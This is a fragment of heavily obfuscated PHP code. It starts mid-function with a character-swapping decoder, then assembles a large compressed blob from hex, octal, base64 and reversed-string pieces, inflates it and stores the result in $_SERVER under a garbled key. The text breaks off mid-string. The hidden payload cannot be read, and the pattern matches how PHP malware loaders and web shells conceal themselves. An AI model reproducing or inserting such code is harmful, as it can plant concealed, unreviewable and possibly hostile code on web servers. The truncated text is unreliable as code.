ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\305\304\217\307\320\364", strrev('ÓËÏóÕ›')); $_SERVER[ÅÄÇĞô] = explode(strrev('|||'), gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x30\x50\xda\x42\x28\x85\x7\xb4\xa5\x2c\x65\x30\x4\xdb\x89\x16\xdb\xd9\x9d\x38\x41\x96\x65\x5b\x44\xb6\x8c\x24\x67\xb3\x9d\xc9\x58\x1a\x4b\x63"."\x4b\x1a\x45\x33\xf2\x92\x85\xb2\x85\x25\x61\x87\xb0\x95\xf5\x1\xf\x28\x90\x4\x28\x7b\x58\xfa\x80\xd2\xb2\x95\x7\x7d\x10\x28\x65\x8d\x9d\xa4\x2c\xe9\xc6\x2b\xaf\xd0\xf6\xbf\xcb\xb9\xcb\x8c\x64\x78\xff\xf7\xfe".base64_decode('7/v5iHX3ucu555577lk2vbHxobceWbffuv3Xfev3N/z82at30TD6tx/6S8LHbTpgH/Lf4Zs=')."\66\326\324\264\317\236\62\275\363\73\27\377\354\36\355\116\355\247\332\246\150\344\205\27\303\7\277\174\367\51\241\211\133\136\30\233\330\167\37\357\177\314\272\272\21\25\246\165\33\351\217\222\67".base64_decode('bUUfNSzboglJMz9gpGnYyNNfP/3pjkWKes60dRr10R8V+kX+WquzBstXO6MJNd7d1RWKJaA=')."\120\243\234\237\63\123\20\52\150\105\55\7\337\57\350\105\13\365\106\156\116\55\230\5\75\357\110\21\11\51\315\326\372\65\13\132\152\151\126\133\102\135\221\350\162\65\261\274\53\4\45\372\325".base64_decode('1SW9OEZjJBi3taKdMHI6LzFS5P1qDrWFO5VELNAZDwQT4WgnTQ5GOzrCifL0WDQSaQ4EF5c=').strrev('h¥(y:F–l¥ò™hCÁ(@+ÇuyƒE6z´'."\r".'-JUœÑVQ¬À~F««/õmÅtç')."\xa5\x2c\xcc\x56\x8b\x1c\x29\x14\x8d\x9c\xc6\x6\xbd\x58\x1f\xe3\xa9\x34\xa0\x95\x6c\xd3\xc8\x27\x69\x24\x34\x6a\x17\x35\x91\x8e\xfa\x9a\x44\xb\xad\xe7\xa1\xa9\x78\x28\x12\xa\x26\x14\xdc\x41\xa5\x35\x16\xed\x50".strrev('’†b+—šS%¬h±¡S­ÖsÖÁk&Q J4N—€«XÉª›§pR({ieEëešr`')."\x66\x2e\x67\xe6\x7d\xa8\x15\xb4\x92\xb6\xd4\xd5\x50\x2c\x46\x3\x1e\x0\xef\x48\x18\x2f\x1a\x44\xa2\xad\xad\xf1\x10\x8f\xc1\xe0\x4e\x8d\xa0\x9e\xcc\x0\xf8\x74\xc4\x52\x3\x59\x5b\x1d\xd6\xb2\x25\x6\xa6\x43\xf4"."\267\32\176\340\327\264\0\164\127\33\171\243\4\140\12\115\230\46\337\126\20\50\261\322\72\113\321\123\20\310\241\372\46\324\353\207\264\176\126\152\220\5\14\264\103\207\151\260\151\41\375\235\17"."\365\373\125\234\247\27\155\125\317\47\315\224\221\207\175\274\10\340\121\263\63\55\105\3\25\240\361\1\63\233\142\141\313\130\3\243\34\60\262\172\147\51\47\27\341\321\144\306\310\246\212\154\353"."\175\125\111\32\215\360\235\214\313\212\130\1\365\204\43\1\143\140\114\154\105\134\256\213\347\132\146\251\230\324\303\150\353\320\170\75\44\353\266\215\6\307\46\304\354\56\144\115\55\25\327\213\174"."\150\206\331\212\32\212\226\154\71\261\104\212\265\232\305\134\13\102\32\162\132\7\332\66\206\110\34\142\333\45\45\315\226\277\246\347\14\357\77\372\172\116\106\177\152\1\43\366\102\177\62\172\66"."\253\352\243\72\354\247\134\152\226\305\46\302\157\365\33\171\77\112\241\321\160\124\315\150\126\246\43\65\113\45\265\30\242\115\351\243\276\102\246\0\233\235\357\357\136\7\274\343\151\353\64\355\220"."\x84\xae\xb3\x66\x52\xcb\xca\x43\xa1\xe1\x8c\x6d\x17\xe2\x7a\x3e\x85\x67\x1\x86\x62\x8e\xe4\xc9\x2c\x15\x74\x1d\xa\xb5\x78\x94\x94\xd2\xa1\x2c\x57\xda\x1b\x8d\x46\x8b\x55\xcc\x65\x79\x88\x8d\x8e\xa7\x59\x3c\xd1"."\x1e\x65\x4b\x99\x1a\x0\x48\x65\xa7\x45\x15\x7c\xd0\xb0\x8\xe2\x13\xbb\x56\x2b\x14\xb2\x46\x52\xb3\xd\x33\xef\x37\x93\xb6\x6e\x7b\x2d\xbb\xa8\x6b\xd0\x62\x20\x99\xd4\x2d\xcb\x1b\x34\xf3\x76\xd1\xcc\x7a\x3\xd9"."\254\71\342\215\26\215\264\221\157\124\246\1\16\106\231\150\257\173\61\136\154\204\15\134\65\137\301\100\203\77\63\255\251\144\17\170\347\262\215\311\113\27\265\274\65\240\27\275\41\330\25\215\12".base64_decode('6ixHjqxYi2EVTMvA3WtUNNvWkhmMWETzTV9R3shnjbxeXhY1onu7ilo6pzUqhVI/mgDYjJA=')."\x96\xc4\x25\xe4\xc2\x30\x1\x8d\x4a\x4e\x1b\xf5\x6a\x69\xd6\x52\x68\xb4\x60\x14\x75\x8b\x8d\x5a\x69\xeb\x48\x0\x44\xd\x78\x3b\xf0\x26\x32\xf4\x94\x37\x8e\x30\x37\x34\x36\xa3\x6e\xa6\x82\x60\x45\x61\x79\x34\xb5"."\75\221\350\122\303\255\350\150\356\14\251\35\201\104\260\35\132\267\265\64\153\72\202\360\61\157\222\45\56\363\242\315\204\241\251\23\15\116\44\166\231\43\172\21\175\270\171\254\121\31\62\123\375"."\346\250\217\145\341\302\161\204\125\130\141\274\276\5\333\33\323\362\151\74\214\376\61\133\267\334\170\251\31\35\344\276\1\272\163\175\375\372\200\131\204\321\130\303\151\347\344\107\364\174\332\316\260".base64_decode('tuOh2JJQTI1HWxNLAzE49/MIckZZb/DXs96YnkKTmLRZPa0gZn+ZF28Y/HGWizcRy4uE2/A=')."\334\265\170\55\124\310\53\227\142\155\107\214\234\201\207\147\363\34\62\331\210\50\150\203\16\371\311\230\233\172\255\151\65\275\251\351\265\136\364\167\132\155\117\157\213\157\132\337\42\277\41\352\370"."\353\175\365\112\103\335\154\245\13\121\51\206\226\125\140\320\145\45\352\224\350\142\347\264\10\10\317\233\171\275\342\306\102\200\144\132\272\267\135\327\20\202\106\13\341\130\27\17\373\26\215\177\305".base64_decode('7OJzUsIlrnWhibHQqd2heELtCCXaoy3Q/VAAQnlUmfSXrTEmyuBIzEOz+qh0fohzIClPCKk=')."\327\151\216\60\314\357\2\240\140\106\117\16\115\222\207\102\60\32\223\342\45\266\164\75\364\247\17\240\271\217\376\250\152\60\22\12\304\124\240\146\125\303\152\225\216\120\34\345\350\126\65\373\7".base64_decode('EaB16OxMgQ+Hc2hLi4GozvOOjbJDAD7aQUuNFD8QUbRdN9IZ6LeBm0uaWbOoZfFRwGjYtAE=')."\x58\xb9\x90\x2d\xa1\x6d\xe0\xc7\xd\x27\x32\xa5\x5c\x3f\x1c\x5c\x68\xca\xd2\xba\x2d\xc8\x4b\x6b\xc\xd1\x60\x39\x76\x38\xa3\x13\xde\xe\xb7\x38\x8e\x60\x88\xf9\x55\xc\xba\xbd\xbe\x42\x3e\x5d\x7b\x22\xb4\xa5\x36"."\xcc\xaa\xc3\x9\xb0\xaa\x30\x32\x44\x67\x97\xf4\xf2\xa1\xfb\x92\x26\xda\xe7\x1d\xda\x90\xde\x88\xc7\x2\xc8\x6d\x3e\x49\x65\x11\x9\x7f\xce\xc7\x47\x5e\x93\x1b\x4d\xe0\xd5\xca\xfa\x72\xa8\x11\xd2\x66\xd0\xe4\x87"."\64\275\311\314\167\36\171\212\136\54\232\305\343\241\4\11\53\344\334\304\313\5\215\333\234\2\261\20\106\140\341\214\311\51\26\223\301\146\243\37\306\75\265\241\25\260\110\12\121\156\76\313\106".strrev('M&œ¢Hé9è§©1ÈÇ‹ÅŸâ"1Q;s2'."\r".'ÿ gÇğ,Œ%°1Öæ’•R¥¨€‹')."\143\237\54\332\46\316\54\72\112\42\40\315\230\320\151\4\25\60\340\22\37\71\233\203\224\236\325\31\200\145\164\106\152\324\101\61\264\62\34\374\6\370\76\100\27\11\224\52\350\73\303\212\241"."\x9a\x98\x30\x60\xf1\xa5\xf8\xe6\x25\x12\x30\x75\x4\x70\x25\x82\x59\xb4\xaa\x51\xb2\xa1\x44\xbc\xab\xa8\xf\x18\xa3\xc\x95\x8c\xda\x1d\x5a\x71\x88\xd\xc\xd5\x14\x5b\x11\x47\xa4\x6d\xda\xda\x1d\x89\xa8\xc1\x68"."\147\2\135\334\150\312\322\130\70\21\142\30\53\320\242\6\202\135\20\23\70\220\23\160\62\11\102\123\206\33\0\204\120\47\374\202\126\102\207\165\301\314\43\114\13\310\312\53\256\165\145\131\51"."\x41\x4a\x0\xec\x8\xf2\xc3\x45\x51\x20\x9a\x20\xb7\xc6\x9b\x43\x78\xc5\xcb\xfb\xd4\xd5\xd\xb4\x0\x83\xa\x46\x12\x37\x8f\x61\x6a\x97\xa1\x8e\x74\x7e\x9\x5f\xf9\xa5\xf1\x99\xde\xf6\x8e\x40\xd0\x1b\x6f\xf\x34".base64_decode('zJpNU5fnUr2JdsPqXcHj0J0Ra6Za1NGeZrDQUFfPdhyiSzTR8+XenBe3gklKX11dHWtr+mw=').base64_decode('JYNQCcffKTJadsspJYd0GZ1b3hGD4bwTOTl+YvnkWyVyuqlaEjenosp2yZJnCgFgClUxGJU=').base64_decode('TFO1bNpEcJfJyYkpDr80rlOSCz6U0fg84dljmwMRdGNyJTzNqA8MfztpbCVReaIp6R6G2RY=')."\375\50\340\223\15\141\155\266\154\47\321\237\51\320\215\22\332\267\105\143\215\64\373\213\130\113\14\147\106\343\360\311\321\134\126\334\277\140\152\140\66\345\241\215\252\50\107\205\34\125\316\151\347"."\x78\x80\xad\x42\x47\x8b\x6b\x4f\xd0\xc3\x9f\xa6\x2d\x58\x84\xbe\xa8\xc\x63\x6e\x8e\x99\x6f\xaa\xae\xf7\xd5\x55\x2b\xec\x56\xda\x54\xdd\x9d\x68\x45\x74\xfa\xa2\x85\x53\x16\x4\xcd\x5c\x1\xa3\x15\x72\x5\xc3\xe3"."\xa5\x90\xbb\x10\xc6\xb8\x0\xd3\x40\x2c\xd2\xe5\x9a\x8e\x50\x42\x83\x53\x67\x81\x5f\x2e\xb7\xc0\x3f\x59\xab\x30\x14\x4c\x98\x2d\x53\xbb\x22\x81\x44\x6b\x34\xd6\x1\x30\x5e\x28\x8\xb0\x2a\x24\x2b\xed\x36\xaf\xc0".base64_decode('SCXLq2M6GXaBlsy6QFSei2UVIXFZJUhc5oLEZeWQuKwSnA0DQGo5bY2ZR/sVHbQ5XxLAItE=')."\36\356\134\254\166\104\133\102\21\65\334\211\350\271\104\171\172\167\127\113\200\241\101\71\275\71\232\150\167\244\166\43\212\156\111\40\22\166\27\17\55\13\307\23\361\212\131\50\255\73\344\312\151"."\151\126\273\142\241\326\360\62\36\155\15\207\42\55\161\65\30\10\266\213\62\235\201\16\210\40\132\111\317\246\54\277\263\274\212\110\323\70\147\271\251\0\160\20\163\160\271\124\306\277\121\5\46".strrev('ğ!QX0ÉŒµCò »Ä	V§ô5\'îÎÓŠèµ};²hN%UC*$d–™‹†–×F')."\x7d\x5\xc8\xe4\xb2\x1e\xa8\xb8\x4c\xb3\x74\x19\xaa\x9c\x10\x18\xb0\x39\x25\xea\x8a\xa3\x23\x44\xe4\xa1\x15\x8\x10\xee\x28\x82\x4\xb2\x22\xf0\x19\x3\x1d\x48\x45\x3b\xc0\xba\x33\x20\x38\x93\x6a\xb4\x2b\x14\xb".base64_decode('YL6mujQW7WyDCiMZnXUgDNNfw26nwN60xbmuZQ2N8bnEpA+abCrRjZzR/Hk2z/2YqGGULgs=').base64_decode('DKCNzAgSs8Tb7zdNaDOLL2L8oOUM0UGLgcUoO6Kn8yMMgDW6ONSpMliiMQn+aEIoFovGYAo=')."\x6c\x73\x88\x31\xc3\x68\x66\x2c\x14\xf\x25\xd8\xb7\x57\x97\xc\x36\x41\x7e\xdf\x74\x80\x5b\x1d\x91\x75\xf0\x79\xff\xca\xde\x91\xe9\x35\x3d\xde\xe9\xbe\x3e\x14\xa8\x9d\x76\x32\x8d\x42\xac\xd7\xe7\x88\x32\x6a\xbb"."\124\344\265\61\45\130\143\55\252\155\354\365\367\372\153\26\65\366\4\274\153\64\357\232\72\357\74\157\37\242\321\153\247\103\102\337\332\6\317\314\365\270\0\52\270\350\204\76\364\323\324\273\150"."\152\257\367\244\323\126\235\334\323\333\127\335\70\375\370\136\337\11\275\43\175\323\152\27\261\357\44\113\105\164\15\140\147\33\352\152\152\172\15\352\22\272\267\362\42\171\11\25\223\2\54\143\215".base64_decode('URCpa2evZ+loDfW0qNHj7Z3et0iqJyW5v4WwKSL6MrxcwLsCj4xXxTsd4KOUT4oDEe+Efo0=').base64_decode('XwDTeXGzsoucQTqMoFPg3LVT6e96tpBpfZQhg/yAwQiqUt5Yza44eX01BEybQ7Ruj+gMPFA=')."\xba\x23\x8e\x80\x83\x9d\x3\x28\x4b\x8a\x65\xa5\x73\x83\x70\xb3\x38\x8c\x72\x60\x32\xa\x2a\xbe\xed\x8d\xf0\x18\x3a\x56\x60\x9d\xe\x84\xd2\x56\x52\x2b\xe8\x71\x69\x84\xaa\x9a\x8\x34\x47\x42\xfc\xea\xa\xb8\x97"."\xc5\x9\x1e\x6c\xe6\xcf\x28\x68\x68\x2\x87\x32\x8c\x20\x71\xaa\x8\xe7\x8\xf6\xba\xb5\x3a\xab\x10\x54\x40\xaf\x59\x8d\xe4\x45\xc9\x2a\x15\xf0\x8d\x49\x41\x2b\x8e\xe6\x56\x41\x14\x9c\xd2\xb4\x50\xa1\x53\xe\xf5"."\124\171\1\12\374\46\204\131\235\272\330\364\30\47\101\237\12\142\205\54\164\23\141\167\1\177\115\157\157\251\107\117\365\365\40\300\327\274\3\175\153\147\254\257\145\354\24\177\57\372\217\105\2".strrev('˜]Àˆ÷].ŞšŒRC'."\n".'p$Me­¦ÛÛ¸à¢Õùj4ÙáÛ78pøJÚ¡1ÂSfÍT6Ş').base64_decode('6JCehwgq7eS8VE4TS+8TuEZct328hEfKVFHc8VTXVMUQfR5trKB0zFHuepywBBxvSpauFZM=').base64_decode('mdZSNmtzxkzWGIIvwK6BJy4vnATTK1VFtxLGp5wG3aiaVqlgOJ83U/0y0IkDti2ASJmEUsM=')."\x9e\x63\x94\x70\xa7\xd2\x1c\x8d\x46\x42\x81\x4e\x5\x9f\xe5\x70\x6\x21\x42\x21\x1e\xea\xa\xa0\x3\xc\x73\x3c\xe3\x89\x10\xbc\x10\x85\x5b\xbc\xac\xdd\x65\x5e\xc6\xdf\xe0\x1\x3\xa6\xdd\x2c\xd0\x7b\x85\x6e\xab".strrev('İnBÕ†<[†Lê¶àz–¿'."\0".'¡°ÏWˆõõqYƒÚõ…tÁáO˜<Î_‡\'¡“Y')."\344\3\44\213\165\301\316\140\6\164\126\33\363\320\356\104\364\141\75\353\141\354\32\17\353\243\207\61\251\74\204\271\324\2\335\352\106\33\13\272\105\202\10\177\146\74\30\200\60\374\172\304\273"."\213\307\34\311\353\105\122\4\46\106\134\330\75\342\62\357\111\27\315\122\241\213\175\123\212\321\156\101\202\350\63\117\210\231\246\355\141\174\57\217\314\0\203\136\4\330\76\251\70\235\225\107\103"."\xe6\xdf\xdd\x9\x80\x2f\x9c\x55\x3e\x4b\x5f\xb3\x58\xe5\xeb\xe1\xe4\xfd\xad\xa5\x2d\x2\xdf\x73\x3d\x3b\xef\x1c\x65\x8\xf\x8e\x53\x9e\x78\xc2\x45\x68\x89\xd8\xa8\x78\x0\xad\x1a\xbc\xf0\xd1\x66\xe5\x30\x7\xd0".base64_decode('vBNQxTOLeFwTdK6bDeN+dsMfRZepuPQ5W0uzb2Fkxa9aFYrScExPjiUFX6dF4hY5Y03O8Xg=')."\310\6\252\4\374\225\27\227\3\64\137\213\51\7\36\310\46\227\101\71\137\130\307\346\370\372\155\11\3\42\270\57\132\20\164\4\355\54\306\277\161\164\256\265\146\331\154\64\310\331\200\171\75".base64_decode('zhjeVT6CickLdpxzEiOh1oRyShShLcNUaR0VF1bIHzOvONpm06U0kXwR1/IpmrIKofhVTVU=')."\xec\x23\x55\x8e\xea\x2\x3e\x9c\x9d\xf0\xb0\xa8\x52\xe\x71\x78\xba\xe5\x49\xc0\x70\x40\x86\x2f\x8e\x25\x96\x14\x15\xa7\x60\x9\x88\x3f\xcd\x82\x8b\x17\xe6\xc3\x42\x48\x67\x69\x62\x69\x65\x80\x94\xf0\x8c\x48\x60"."\xfd\x72\x7c\x17\x47\xc5\x66\x62\x20\xa1\xe0\xf\x78\x24\x72\x5\xe3\x12\xaf\xd8\x16\x52\xd4\x39\xe5\x2e\x88\x74\x9d\x9d\x78\x8a\xba\x8c\xfc\x98\x91\x8f\x1b\x98\xaf\xe0\x4e\x85\xfd\x4d\xba\xd0\xa5\x59\xd6\x8\xa2".base64_decode('CeD4mzZtmiJOZ0Ec4E0vYhRoJwvTwwXzHujnPfCC7Mka+SHp4BYsTzQ4XFUaGrTkGhg0JBU=')."\21\23\4\373\34\66\104\106\53\212\271\146\330\11\243\10\76\6\13\27\21\121\251\330\200\66\54\10\27\107\35\11\307\130\366\30\353\275\34\164\66\112\243\55\36\362\333\216\72\57\357\146\276"."\172\45\324\163\126\210\242\46\204\52\42\150\256\320\17\31\110\302\364\140\176\77\372\241\307\73\23\44\40\205\330\266\50\345\132\340\375\0\207\227\40\374\300\350\65\64\341\65\14\277\0\221\241"."\112\154\2\216\237\234\144\2\355\111\200\243\175\104\321\147\321\51\127\364\341\55\324\206\317\52\66\47\24\373\311\40\31\327\321\70\241\171\321\102\274\54\117\56\55\270\175\370\30\20\307\6\177"."\103\343\73\120\314\257\330\156\151\321\41\74\235\152\171\77\60\4\127\216\267\26\115\116\364\362\23\337\135\50\110\356\227\134\36\304\165\112\113\363\341\240\54\312\222\244\72\156\32\303\225\352\212"."\142\272\243\302\71\4\335\44\117\67\105\172\240\371\320\155\1\304\172\74\165\22\371\45\320\317\132\372\174\6\7\340\172\327\372\332\246\211\256\240\105\137\21\175\121\164\104\102\175\200\30\210\170"."\107\134\33\320\145\242\301\221\31\50\24\104\267\171\373\26\252\42\241\167\47\325\304\332\214\27\64\206\325\25\257\342\152\101\53\24\344\157\162\222\217\1\74\271\240\224\170\202\2\257\243\164\324"."\142\110\274\257\64\43\302\351\145\214\131\102\51\303\306\51\170\253\232\354\155\111\24\24\147\257\273\262\210\313\207\1\71\323\312\300\106\134\106\74\123\35\45\235\4\10\44\116\43\304\202\117\320"."\113\225\5\242\222\146\1\140\111\22\22\314\231\303\272\224\210\237\371\12\42\107\212\322\154\51\113\64\52\225\342\113\101\172\204\166\146\212\120\331\142\26\110\131\250\113\56\353\164\363\373\360\245"."\304\47\243\370\100\261\310\100\237\16\23\77\101\243\104\71\11\143\316\70\333\267\225\16\102\332\170\150\130\210\0\322\246\360\207\175\24\161\340\167\316\150\236\357\27\21\56\57\52\263\52\53\67"."\x14\x17\x4f\xff\xce\x58\xe5\xe2\x81\x6c\x56\x8\x6b\xb9\xe3\x93\x56\xa1\x8\x43\xae\x24\xa7\x4c\x5a\xad\x95\xdc\x8f\x99\x9c\x43\xa5\x34\x7e\x33\x9a\x9c\xda\x77\xbf\xb7\x3b\x91\xfc\xe4\xc4\xd0\x24\xe8\x51\x2c\x63".strrev('ŠBRŒŒ¿ñU¸ùÂùu‡‘E©‰<à¸2ãÌùwTÏÿ»a*´Q€Î~3¯#ƒ×:8å').base64_decode('qLaDGouR9qXt5IAQtH3pfODDLhz1WZPArLscl2whOHGUn9FyJZyF11JuVFB/X1GeNy4oQbk=')."\x1c\x82\x5d\x9c\x31\x59\x5f\x59\x36\x6f\xe5\xb6\xd7\xb7\xef\xb8\xf7\x4a\x1a\xfe\xf2\xf\x37\xfe\xe3\xd6\x2b\x68\x78\xb0\x58\xd0\xf2\x23\x30\x59\xf0\xee\xb4\x6e\x5f\xf4\x77\x5f\x1a\x16\x62\xe9\x1b\x96\x8d\x99\x47"."\77\367\275\266\323\117\73\264\372\301\157\206\16\66\66\136\321\162\357\235\123\342\13\116\74\345\10\63\374\340\333\243\365\157\137\77\165\351\165\277\133\376\362\313\33\157\375\340\307\27\74\170\376"."\x9f\xdb\x36\x1e\x51\x3a\xe3\xd1\xcc\x7f\x1c\xe5\x7d\x65\xbf\xdc\xc7\xfb\x78\xf\x3b\x31\xf0\x64\x47\x69\x67\x8f\x3d\xbc\x6b\x47\xdf\xab\xa7\xec\x1f\x98\xf1\xe7\x77\x8e\xd9\xfb\xf9\xe3\xc9\xcd\xa7\xfd\xe9\xf5\xcb"."\x8f\x6b\x1a\x1b\x3a\xbd\x70\xdc\x4d\xdf\x3d\xe6\x8b\x57\x6e\xd9\xb3\x70\x66\xfd\x19\xd7\xdd\x72\x74\x70\xfa\x4f\xf6\xa4\xf\x7a\xf3\xcb\x69\xb7\xef\xf3\xc6\x27\x9f\x7f\xf7\xc6\xc7\x7e\x79\xdc\xb2\xf3\x1f\xe9\xff".strrev('l¿[o;KÏúÿÔËrœ“<<î;‹+íüñ·]öËÖê}^»ùÁÿäò:Ïç­u¶‚ï§8ì÷“ã')."\xcf\x7f\xfd\xec\xe9\xce\xb\xf\xff\x74\xf9\x45\xfb\xde\x6e\x8c\xec\x7e\xe7\xf0\xb3\xdb\xae\x49\xec\x7b\xeb\xcb\x9b\xee\xbc\xfc\xc6\x77\x5f\x5b\xb8\xec\xd2\xd4\xc2\x63\x66\xbe\xb0\xee\xd5\x4f\xfe\x78\xef\xb2\x8d".base64_decode('Jz0wcNavR37/0if9fZsuX3fIZX+55pvVxsexg+avfPW8+NN706/PmT1nxkf3/v2AGb+11/c=')."\x9d\x7b\xc3\x73\xbf\x7a\xf9\xbf\x7f\xf8\x9b\x97\x2e\x8c\x3c\xb8\xcf\x5f\x1e\xee\x7e\x6d\xdd\x1d\x3d\x3f\xba\x67\x45\xfb\x9d\xf3\xeb\xcf\xbb\xfc\x85\xdf\xaf\x39\xed\xe9\x99\xf3\x6e\x7b\xbb\x79\xd5\xb7\xe\x9c\xb3"."\366\250\337\7\267\127\157\151\55\144\377\362\347\273\126\235\360\330\233\77\150\174\171\301\224\117\6\152\374\267\217\36\177\333\276\331\43\325\253\156\256\76\173\265\62\363\224\340\35\27\237\262\343".base64_decode('kp+OPZP9l4lDrp9yxhm7OurqGxce1pPd/fm6gRXP3DLrjzv2V3aeue/dyQ2Hhvv9F9UMf7g=').strrev('m{Oßn¯Ïíú/ûcØìç>ŞómO1ÃkÇv^7aÆwÚŸkóğ¼îGøáëç=îã').base64_decode('w6vHBE9edchxT1U1j76a3L7j5z868uzUnbOO/XTFOcdf3Fgo/rK399lfXvLyYbf+60etf7g=')."\150\117\176\237\51\167\135\275\343\344\3\314\367\316\77\253\256\256\323\363\320\331\236\335\236\313\76\272\62\27\236\266\357\131\367\275\347\211\355\170\47\324\377\361\314\21\353\333\277\237\161\354\263".base64_decode('/3nx5YsP2K/qpTOrv7NhW37eLSeOP7Xs4uW+956L3Jo55ZiQceCLZz82/cHFafPRger2TrM=').base64_decode('P/Ed/dvfPWbgw/vGz1h4yntzC9bZ3+pMfvepP3/0jQ1LD/mi5dy+Ow5v/0FtX/s3zvU1/H4=')."\xca\x19\x5f\xbe\xfa\xc1\xe9\x81\xe7\x96\xf8\xae\x3b\xa1\xf5\xb1\x60\xef\x37\x5f\x78\xf5\x95\xe6\x5f\x1c\xd3\xfe\x6e\xcb\xde\x47\x4f\x3e\xb7\xbe\xed\xe5\x7f\xf9\xe8\xf\xdf\xf9\xd7\x3\x6e\xec\x5b\xf5\xef\x97\x2c".base64_decode('X1312u4d9fecceh3YoPzztpy3prDP685vuHGTftfNfeDX726asN5n75/6f6nthSP8F6w+NI=')."\xcd\xfb\xad\xac\x3d\xe9\x1b\x3\x7f\xf8\xe8\x99\xfe\xd1\xd3\xe\xde\xef\xdc\x87\xce\xd9\x71\x86\xb9\x72\x6d\x24\xec\xf5\xfd\xec\x99\xef\xdf\x7e\xe1\xb6\xab\xf7\x7f\xa4\xd1\x37\x70\xf5\xd9\xc9\xb3\xeb\x2\xe7\x3e".strrev('ç<CğuLû_û¡Æp§|ß»ÀúŠæxÓ?÷uÄ¦ıAğ4·¿oÇk¸¬§ëñ÷ÖÚßóîö<')."\371\243\262\357\136\163\333\323\67\334\126\234\131\235\271\342\324\231\323\236\352\365\34\367\233\243\126\334\273\322\374\321\320\3\47\335\176\354\322\7\37\350\274\377\315\237\370\227\35\60\367\254\243".base64_decode('N179y7eeOMKY9dYPgn3bUn/adObdRxz4y2tvid219cgzbm26ri4QW/PEzS987/Izjn1x6KI=').base64_decode('2gfX1Vzxg3dOeXakdPTz+voFm+seyn18a+njl5ftrb/VeGZ248rRZOLdwbt+0vDXX52uzs0=').base64_decode('3PG7gzzfX3zE7jnH2n/c/7JP3jz47eMf1Lr+ll/120vOXD/3oNM/Xv/rK++4zLvt+r3pzeY=')."\222\351\177\70\346\351\314\366\325\357\377\142\323\163\337\76\343\371\324\373\77\73\376\265\47\266\254\370\346\373\37\35\160\374\276\37\175\377\304\375\57\177\350\331\361\47\364\137\376\354\375\326\107".strrev('×¶†ÜŞø?ŞÏ´ïWå?®2Ş‡ÌëùàtŞ¶­İbpßt¼_üû½ç]½ı#¢·Æ²®…·')."\217\372\335\217\16\372\341\75\77\353\311\316\234\366\331\334\133\77\357\75\374\374\15\77\375\145\353\262\157\357\336\347\202\233\232\337\376\355\123\333\177\374\223\317\122\7\174\321\274\171\363\163\43"."\177\75\270\153\166\347\271\267\134\362\310\203\347\264\274\331\273\361\231\167\17\373\353\352\131\143\157\74\172\304\366\373\237\75\372\332\65\177\170\345\262\71\207\175\161\345\262\207\366\171\260\277\341"."\147\333\42\227\264\136\324\164\105\317\214\275\157\217\177\364\305\103\245\23\256\352\353\121\127\256\170\344\176\273\372\371\37\136\162\305\233\307\376\364\257\207\336\377\202\272\350\261\57\137\363\157\121"."\xff\xfe\xc9\xdf\x3e\x7b\xed\xae\x27\x17\xfc\xfd\xd3\xff\xde\xf4\xd1\x1b\x5b\xdf\x7d\xec\xb4\xbf\xff\xe7\xb3\x2f\xfc\x78\xe5\xba\xbf\x7c\xf0\xa7\x3f\x3f\xb9\xf2\xf1\x75\xa5\xcf\xce\x55\x5f\xfe\xe4\xf0\x7f\xac\x7d"."\306\377\217\367\156\137\137\334\233\136\375\205\161\151\372\360\151\47\35\132\375\207\113\207\25\175\356\161\335\373\255\72\361\376\263\177\364\227\33\356\273\351\127\337\255\253\311\355\267\160\377\337\145"."\176\261\160\277\277\325\234\376\116\154\64\74\357\276\167\337\376\350\156\357\321\375\375\327\77\335\222\334\162\342\325\155\326\141\127\367\377\140\343\341\217\174\363\273\207\350\377\335\125\33\275\171\367".base64_decode('E9pFx932Tt+Kse3FkeXTUy1vvXSPfpz/Hs/evd2PjZ9pXHfSC5sm3rxh9hXar0697Iat55w=')."\xfa\x4a\xfc\x82\x4b\x97\x4e\xe9\x1e\xdf\x7f\xcf\xc5\xa3\xdf\x38\xf4\xda\xd6\xd3\x17\x6c\x3e\x6c\xc5\xad\xb1\xfb\xa6\xdc\xfb\x5f\xf3\x7e\x97\x1e\xf8\x4b\xc8\x7b\xd8\x99\x55\x87\xda\x27\x7d\x9c\x4a\x5c\xf1\xf9\x3b"."\333\216\15\337\377\373\317\6\346\44\337\372\254\357\7\207\137\373\233\203\132\117\333\365\306\216\127\76\275\377\326\133\76\75\60\176\111\327\334\167\76\355\131\371\322\105\133\172\136\332\166\343\161"."\243\17\277\377\355\71\233\336\373\376\256\327\377\364\303\365\113\36\174\256\355\366\324\243\327\356\171\375\357\377\150\251\76\144\343\346\313\7\177\274\365\222\63\137\373\363\207\133\336\365\75\160\373"."\x23\x9f\x4c\xbc\x33\x76\xda\x4b\x9f\x5e\x3c\x67\xed\x67\x3\x77\xf6\xbd\x74\xc9\xb4\xc6\x17\x5f\xf9\xf0\xdb\x77\xd5\xae\x5d\x70\xcd\x45\xf3\xe7\x6f\xbe\x61\x62\xc9\x4f\xf5\xfd\xe3\x1f\x5e\x78\xc1\xfd\xf\x3d\xf6".strrev('ÿ¿;—Õex‘~ßüúšßÏİd|n¥'."\r".'OƒØÙÍãûo›‘Äö÷ºY¨ÛïÇöæû½/íÆõkÄ')."\xc2\xf1\x2f\x9e\xaa\xdc\xf1\xc6\x5f\x3b\x7f\xfe\xc3\x3f\xd8\xfd\x8f\x24\x96\xe4\xdb\xe\x39\xf2\x85\xbd\x1b\xd7\xd4\x6e\x59\x7b\xf1\x21\xcd\x97\xbd\x17\x3c\xf1\xf3\xf\x1a\xfb\x37\xab\x2b\x92\xef\x9d\x7a\xf2\x29"."\241\175\337\74\360\213\331\307\177\373\364\363\166\314\130\176\327\257\217\72\354\314\137\237\176\300\303\117\34\267\167\307\321\127\377\364\72\143\355\131\307\16\257\331\157\347\267\176\273\370\356\247\37"."\x5e\x70\xd1\xf3\x47\x35\x9c\xde\x73\xc1\x37\xdf\xd9\x7f\x45\xfc\x85\xda\xbf\x35\xfc\xe2\xe0\xd7\x73\xad\xd3\x37\x5e\x7f\xc6\xbe\xd7\x36\x5c\xa8\x3d\xfe\xc2\x13\x31\xfb\xe7\xbf\x79\xfa\xd7\xff\xf6\xde\xda\xb6\xde"."\xf1\x35\x1d\xaf\x25\x2e\x7b\xbf\xf0\x8e\x7d\xc9\xf8\x8b\x1b\xcc\x2f\x9f\x3